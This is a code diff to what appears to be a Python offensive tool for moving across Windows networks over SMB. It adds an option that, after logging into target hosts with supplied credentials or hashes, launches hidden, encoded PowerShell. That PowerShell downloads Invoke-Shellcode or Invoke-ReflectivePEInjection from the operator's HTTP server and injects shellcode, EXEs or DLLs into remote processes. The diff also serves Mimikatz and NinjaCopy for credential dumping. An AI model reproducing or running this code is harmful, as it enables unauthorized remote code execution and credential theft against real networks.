@@ -183,17 +183,19 @@ class SAMR_RPC_SID(Structure):
 class MimikatzServer(BaseHTTPRequestHandler):
 
     def do_GET(self):
-        if self.path == "/Invoke-Mimikatz.ps1":
+        if self.path[1:] in os.listdir('served_over_http'):
             self.send_response(200)
             self.end_headers()
-            with open('served_over_http/Invoke-Mimikatz.ps1', 'r') as script:
+            with open('served_over_http/'+ self.path[1:], 'r') as script:
                 self.wfile.write(script.read())
 
-        elif self.path == "/Invoke-NinjaCopy.ps1":
-            self.send_response(200)
-            self.end_headers()
-            with open('served_over_http/Invoke-NinjaCopy.ps1', 'r') as script:
-                self.wfile.write(script.read())
+        elif args.path:
+            if self.path[1:] == args.path.split('/')[-1]:
+                self.send_response(200)
+                self.end_headers()
+                with open(args.path, 'rb') as rbin:
+                    self.wfile.write(rbin.read())
+
         else:
             self.send_response(404)
             self.end_headers()
@@ -2374,6 +2376,35 @@ def ps_command(command=None, katz_ip=None):
 
     return b64encode(command.encode('UTF-16LE'))
 
+def inject_pscommand(localip):
+
+    if args.inject == 'shellcode':
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Shellcode.ps1');
+        $WebClient = New-Object System.Net.WebClient;
+        [Byte[]]$bytes = $WebClient.DownloadData('http://{addr}/{shellcode}');
+        Invoke-Shellcode -Force -Shellcode $bytes""".format(addr=localip, shellcode=args.path.split('/')[-1])
+
+        if args.procid:
+            command += " -ProcessID {}".format(args.procid)
+
+        command += ';'
+
+    elif args.inject == 'exe' or args.inject == 'dll':
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-ReflectivePEInjection.ps1'); 
+        Invoke-ReflectivePEInjection -PEUrl http://{addr}/{pefile}""".format(addr=localip, pefile=args.path.split('/')[-1])
+
+        if args.procid:
+            command += " -ProcID {}"
+
+        if args.inject == 'exe' and args.exeargs:
+            command += " -ExeArgs \"{}\"".format(args.exeargs)
+
+        command += ';'
+
+    return ps_command(command)
+
 def connect(host):
     try:
 
@@ -2414,6 +2445,8 @@ def connect(host):
 
             noOutput = False
             smb.login(args.user, args.passwd, domain, lmhash, nthash)
+
+            local_ip = smb.getSMBServer().get_socket().getsockname()[0]
 
             if args.download:
                 try:
@@ -2519,11 +2552,13 @@ def connect(host):
 
             if args.mimikatz:
                 noOutput = True
-                local_ip = smb.getSMBServer().get_socket().getsockname()[0]
                 args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip))
 
             if args.pscommand:
                 args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
+
+            if args.inject:
+                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(inject_pscommand(local_ip))
 
             if args.command:
 
@@ -2649,6 +2684,12 @@ if __name__ == '__main__':
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
+    xgroup = parser.add_argument_group("Shellcode/EXE/DLL injection", "Options for injecting Shellcode/EXE/DLL's using PowerShell")
+    xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll'}, help='Inject Shellcode, EXE or a DLL')
+    xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems')
+    xgroup.add_argument('--procid', type=int, help='Process ID to inject the Shellcode/EXE/DLL into (if omitted, will inject within the running PowerShell process)')
+    xgroup.add_argument("--exeargs", type=str, help='Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)')
+
     bgroup = parser.add_argument_group("Filesystem interaction", "Options for interacting with filesystems")
     bgroup.add_argument("--list", metavar='PATH', help='List contents of a directory')
     bgroup.add_argument("--download", metavar="PATH", help="Download a file from the remote systems")
@@ -2666,6 +2707,11 @@ if __name__ == '__main__':
         logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
         log = logging.getLogger()
         log.setLevel(logging.INFO)
+
+    if args.path:
+        if not os.path.exists(args.path):
+            print_error('Unable to find Shellcode/EXE/DLL at specified path')
+            sys.exit(1)
 
     if os.path.exists(args.target[0]):
         hosts = []
@@ -2712,10 +2758,10 @@ if __name__ == '__main__':
 
         args.pattern = patterns
 
-    if args.mimikatz or args.ntds == 'ninja':
+    if args.mimikatz or args.inject or (args.ntds == 'ninja'):
         print_status("Press CTRL-C at any time to exit")
-        print_status('Note: This might take some time on large networks! Go grab a redbull!')
-        print "\n"
+        print_status('Note: This might take some time on large networks! Go grab a redbull!\n')
+
         server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
         t = Thread(name='HTTPServer', target=server.serve_forever)
         t.setDaemon(True)
